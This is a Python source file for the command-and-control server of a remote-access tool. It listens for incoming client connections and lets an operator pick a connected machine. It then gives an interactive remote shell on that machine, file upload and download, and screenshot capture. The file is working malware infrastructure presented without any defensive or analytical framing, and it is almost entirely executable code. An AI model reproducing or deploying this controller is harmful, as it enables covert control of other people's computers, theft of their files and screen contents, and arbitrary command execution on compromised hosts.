import socket
import threading
import time
import sys
import base64

SERVER_IP = socket.gethostbyname(socket.gethostname())
PORT = 5050
ADDR = (SERVER_IP, PORT)
BUFFER = 1024 * 128

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

def server_listen():
    server.listen()
    print(f"[LISTENING] Server is listening on {SERVER_IP}")

    while running[0]:
        try:
            conn, addr = server.accept()
            active_connections.append((conn, addr))
        except:
            continue

def show_connections():
    print(f"[ACTIVE CONNECTIONS] {len(active_connections)}")
    cont = 0
    if len(active_connections) > 0:
        for i in active_connections:
            cont +=1
            print(f"[{cont}] {i[1]}")

def connect():
    show_connections()
    if len(active_connections) > 0:
        try:
            conn_num = int(input("[SELECT] "))
            conn, addr = active_connections[conn_num - 1]
            return conn, addr
        except:
            return False
    else:
        return False

def close():
    running[0]= False
    client_close = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_close.connect(ADDR)
    listen_thread.join()

    for i in active_connections:
        conn, addr = i
        try:
            conn.send('q'.encode())
            conn.close()
        except:
            pass
    
    print ("[CLOSED]")
    sys.exit()

def close_conn(conn, addr):
    try:
        conn.send('q'.encode())
        conn.close()
    except:
        pass

    active_connections.remove((conn,addr))

def download(conn, command):
    conn.send(command.encode())
    try:
        with open(command.split()[1], "wb") as file: 
            file_data = conn.recv(BUFFER)
            if file_data != '[ERROR]' and file_data != '':
                file.write(base64.b64decode(file_data))
                print("[DONE]")
            else:
                print('[ERROR]')
    except:
        print('[ERROR]')        

def upload(conn, command):
    conn.send(command.encode())
    try:
        with open(command.split()[1], "rb") as file:
            conn.send(base64.b64encode(file.read()))
    except:
        conn.send('[ERROR]'.encode())

    result = conn.recv(BUFFER).decode()
    print(result)

def screenshot(conn):
    result = conn.recv(BUFFER).decode()
    if result == '[DONE]':
        command = 'download screen.png'
        download(conn, command)
    else:
        print('[ERROR]')

def shell(conn, addr):
    while True:
        command = input(f"[CONNECTED][{addr}] ")
        try:
            if command == "q":
                close_conn(conn, addr)
                break

            elif command == '':
                pass

            elif command.split()[0] == "upload" and len(command.split())>1:
                upload(conn, command)
            
            elif command.split()[0] == "download" and len(command.split())>1:
                download(conn, command)

            elif command.split()[0] == 'screenshot':
                conn.send(command.encode())
                screenshot(conn)

            else:
                conn.send(command.encode())
                result = conn.recv(BUFFER).decode()
                print(f"[CONNECTED][{addr}] {result}")
        
        except:
            close_conn(conn, addr)
            print("[ERROR] Device is not available")
            break
            

           

def main():
    while True:
        console = input("[CONSOLE] ")

        if console == 'connections':
            show_connections()

        elif console == "connect":
            r = connect()
            if r != False:
                conn, addr = r
                shell(conn, addr)
                
        elif console == "exit":
            close()
        else:
            print("[ERROR] Unknown command")
         

active_connections = []
running = [True]

print("[STARTING] server is starting...")

listen_thread = threading.Thread(target=server_listen)
listen_thread.start()

time.sleep(1)
main()